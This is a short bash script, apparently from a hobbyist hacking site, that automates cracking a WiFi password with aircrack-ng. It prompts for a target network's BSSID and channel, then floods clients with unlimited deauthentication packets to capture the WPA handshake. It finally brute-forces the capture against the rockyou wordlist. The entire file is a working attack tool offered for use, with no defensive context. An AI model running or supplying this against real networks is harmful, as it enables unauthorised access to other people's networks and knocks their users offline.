#!/bin/bash
echo welcome to cipherbikram.com
echo for hack the wifi you need to connect wifi adapter 
echo check your wlan show or not

iwconfig && cat /etc/os-release && sudo apt-get update && sudo airmon-ng check kill
echo -e "\e[31mput your wlan 'examples:- wlan0'  \nclick 'ctrl+c' for next process!\e[0m"
echo -en "put your wlan name:-"  
read lan

sudo airmon-ng start $lan && sudo airmon-ng 
sudo airodump-ng $lan 
echo -e "\e[31mafter put your bssid click 'ctrl+c' for next process
\nselect your target bssid!\e[0m"
echo -e "\e[31m!\e[om"
echo -en put your target bssid:-
read bssid
sudo   airodump-ng $lan -d $bssid

echo -e "\e[31mfile name means where data are store!\e[om"
echo -en "put your file name:-"
read file
echo -e "\e[31mchannel number'examples:- CH-2'
		\nafter found the handshakes click 'ctrl+c' for next process
		\nafter put your channel number wait for handshakes !\e[0m"

echo -en "put your channel number:-"
read channel

#sudo airodump-ng -w $file -c $channel --bssid $bssid $lan& 
#echo -e "\e[31mafter few second click ctrl+c!\e[0m" && sudo aireplay-ng --deauth 0 -a $bssid $lan 

echo -e "\e[31mafter few second click ctrl+c!\e[0m"  
sudo aireplay-ng --deauth 0 -a $bssid $lan&
sudo airodump-ng -w $file -c $channel --bssid $bssid $lan

#wireshark $file-01.cap
aircrack-ng $file-01.cap -w /usr/share/wordlists/rockyou.txt
sudo airmon-ng stop $lan
sudo systemctl start NetworkManager 
echo "welcome"
